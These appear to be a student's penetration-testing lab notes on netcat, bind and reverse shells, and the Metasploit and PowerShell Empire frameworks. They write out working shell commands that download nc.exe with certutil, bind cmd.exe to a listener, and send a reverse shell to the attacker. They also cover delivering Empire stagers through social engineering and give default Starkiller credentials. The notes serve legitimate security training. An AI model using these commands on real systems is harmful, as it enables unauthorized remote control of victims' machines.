  

### ==_**Bind & Reverse Shells**_==

  

- ==_Netcat Fundamentals_==

> _Netcat (Aka TCP/IP Swiss Army Knife )_ ⇒ is a networking utility used to read and write data to network connections using TCP or UDP .

> Netcat utilizes a client-server communication architecture with tow modules :
> 
> - ==_Client mode_== ⇒ Netcat can be used in client mode to connect to any TCP/IP Port as well as a Netcat listener (server) . `( Connect mode)`
> - ==_server mode_== ⇒ Netcat can be used to listen for connections from clients on a specific port . `(Listen mode )`

> Can be used to ⇒ ==Banner Grabbing== , ==Port Scanning== , ==Transferring Files== , ==Bind/Revers Shells==

  

- Netcat Fundamentals ( imp)
    
    - `nc - -help`
    
    > lets assume that we have target machine which is have we server running on it
    
    - `nc -nv < target ip > < port >` ⇒ that will let us ==_open a client mode , so we connected to the target machine on port_== , -nv ⇒ to disable the dns resolve and set a verbose mode true .
    
    > Maybe on some case we have a firewall in place that’s proxying or filtering our try to connect
    
    - `nc -nvu < target ip > < port >` ⇒ same , but here we try to connect through UDP
    
    > the windows lab env dose not have the netcat on it so we will transfer the executable file of netcat to windows
    
    - `ls -al /use/share/windows-binaries/` ⇒ that’s will list all files we need on windows machine
    
    > we can transfer file using 2 way , webserver || Netcat :
    > 
    > - ==_Transfer file using web server_==
    >     
    >     1. on Linux ⇒`cd /usr/share/windows-binners` && `python3 -m http.server`
    >     2. on windows ⇒ `cd Desktop` && `certutil -urlcache -f http:<ourip>/nc.exe nc.exe`
    >     
    >       
    >     
    >       
    >     
    
    - _On Linux_ => `nc -nvlp 1234` ⇒ to open a listen on port 1234 , so u can connect to the Linux , from windows (server mode ) ( open a listener and wait the clients to connect )
    - On Windows ⇒ `nc.exe -nv <Linux ip (our ip) <port> 1234` ⇒ that will create a connection between a Linux and windows
    
    > U can send massage between the tow machine , just write what u want and that will transfer
    
    - ==_When we want to transfer file remember , the machine want to receive a file need to set up a listener && the machine want to send the file need to connect to this machine to send the file_==
    - On Windows ⇒ `nc -nvlp 1234 >test.txt` ⇒ so here we set up a listener on windows to receive file from Linux , `> test.txt` **_( to save everything we receive from linux to file called test.txt )_**
    - On Linux ⇒ `nc -nv <windows ip > 1234 < test.txt` ⇒ so here we connect to windows listener , the `< test.txt` that the file we need to send to the windows machine .
    
      
    
      
    

  

  

- ==**_Bind Shell_**==

> _Bind shell_ ⇒ is a type of remote shell where the attacker connects directly to a listener on the target system . consequently allowing for execution of a command on the target system .

> why reverse shell better than bind shell ? On bind shell to do that we need to set up a listener on the target system so how we can do that when we dose not have access to the target system , The traffic when u connect or to execute a command on target the traffic will go through the firewall which is will blocked it when triggered it . On the other side the revers shell , we don’t need to set up the listener on the target system , the listener will setting up on our machine and the target will connect with our listener .

- _Bind Shell_
    
    - `cd /usr/share/windows-binaries` && `python3 -m http.server 80` ⇒ to navigate the netcat execution file , and open python server to transfer the file to the target machine (windows machine )
    - On Windows ⇒ `certutil -urlcache -f http:<ourip>/nc.exe nc.exe`
    - On Windows ⇒ `nc.exe -nvlp 1234 -e cmd.exe` ⇒ so here we open a listener on target machine , the `-e cmd.exe` will allow any client will connect to our listener to can run any command on our machine
    - On Linux ⇒ `nc -nv <windows ip> 1234` ⇒ so here we connect with windows machine listener so when we connect we can see we receive a bind shell , so we can run any command we want on the target system
    
    > if we want to flip the process we just modify the `-e cmd.exe` ⇒ `-c /bin/bash`
    
      
    

  

  

- ==**_Reverse shell_**==

> Reverse shell ⇒ is a type of remote shell where the target connects directly to a listener on the attacker system . consequently allowing for execution of a command on the target system . ( reverse of the bind process ) .

> The key thing in reverse shell u want is a connection being made from the target system to the listener .

- Reverse Shell
    
    - On Linux ⇒ `nc -nvlp 1234` ⇒ to open a listener on our attack machine
    - On Windows ⇒ `nc.exe -nv <Linux ip > 1234 -e cmd.exe` ⇒ to connect from windows to the linux machine listener and execute the cmd.exe
    - on Linux ⇒ we can see we have received the reverse shell from the windows machine
    
      
    
      
    

  

  

- ==**_Reverse Shell Cheatsheet_**==

> one of the greatest thing of reverse shell is that we don’t need to init a nc to do a reverse shell , we can do that by PowerShell code , CMD code , python code .. etc.

- Reverse Shell Cheatsheet
    
    - **==_PayloadAllTheThings ⇒_==** u can see a lot of codes to obtain a reverse shell using a lot of types of code
    
    > U just need to execute the code manually by physically accessing the system or through social engineering … etc. usually this code will be a part of exploit so when the exploit execution on target the reverse shell will open automatically
    
      
    
    - ==**_Reverse Shell Generator_**== ⇒ just enter your linux ip and the port of the listener && select the type of the listener u want && select the OS and the type of payload u want
    
    > just copy the payload && open a listener on your linux machine && just u need to let the target to run the payload on PowerShell , CMD …. etc. then if we back to our linux we will see that we get a reverse shell :)
    

  

  

### _**Frameworks**_

  

💡

_==Exploitation Frameworks==_

  

- ==The Metasploit Framework (MSF)==

> Metasploit framework ⇒ is open source , robust penetration testing and exploitation framework that is used by penetration tester and security researchers worldwide .

> Provide penetration testers with a robust infrastructure required to automate every stage of the penetration testing life cycle .

> If u delaying with a web page , like CMS ( WordPress , Drupal ⇒ try to search what is the default crad of this CMS and try it maybe in some case that’s work

> The Metasploit Modules developed by ruby

  

- ==_PowerShell-Empire_==

> _PowerShell Empire_ ⇒ is a pure PowerShell exploitation/post-exploitation framework built on cryptologic-secure communication and flexible architecture

> more useful with red teaming

> Designed specifically to windows target

- _PowerShell Empire_
    
    - `sudo apt-get install powershell-empire starkiller -y`
    
    > First u should run the empire server , is responsible for setup a listener , receive the call back from agency … it worked on background
    
    - `sudo powershell-empire server`
    - `sudo powershell-empire client`
    - `listeners` ⇒ to list all listeners && `agents` ⇒ to list all targets
    - now from the top lift of linux on start tab ⇒ search for starkiller && u can see the starkiller open
    
    > so starkiller is frontend version of powershell empire , so used to interact with clients (targets ) and to interact with servers
    
    - enter the> `username:empireadmin && password:password123`
    
    > explore it , u can see the many tabs , u have 3 plugins , C\#server ⇒ empire servers for agents , used to compile stages with C# for target , websocketfiy ⇒ to interact with sockets … etc , reversshell-stages ⇒ to interact with the reversshell like msfvenom stages
    
    - ==_listeners tabs_== ⇒ that is a listeners that are going- to essentially listen for connections from your target systems && ==stages tab== ⇒ is the pieces of code or the executable code that u need to run on target system through social eng or … etc . && ==agents tab== ⇒ here u can see the target system u are hacked them and the stages run on it
    - First we need to set up a listener to receive connection from the target system ⇒ `click on listener tab` && `click create` && `select http listener` && `set the options`
    - second we need to make a stages ⇒ `click on stages tab` && `click create` && `select type < regarding to your target system` && `enter the name of listener (http)` && `modify the stage name` && `Download it on your linux`
    - ==now we need to transfer the stage.exe to the target system , as u know that can be done using a social Eng. , physical access … etc.==
    - when we do that , we will see the info related to the target system display on the Agents tab
    - u can see on agents tab when u `click on target` , `u can run command` && `see the all file on target system`
    - on powershell-empire u can see new listener created and new agent added ⇒ `interact <target system name >` ⇒ that will display all command that’s run on target system